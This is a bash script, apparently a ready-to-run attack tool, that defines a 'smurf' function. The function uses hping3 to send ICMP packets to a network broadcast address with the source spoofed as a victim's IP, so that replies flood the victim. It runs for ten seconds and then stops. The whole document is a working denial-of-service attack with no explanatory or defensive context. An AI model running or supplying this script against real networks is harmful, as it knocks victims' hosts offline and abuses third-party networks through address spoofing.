#!/bin/bash
function smurf ( )
{
    local victim_ip=$1
    local broadcast_ip=$2
    hping3 --icmp ${broadcast_ip} -a ${victim_ip} -i u128000 -d 1546 -V 
}

smurf $*  & sleep 10; kill $!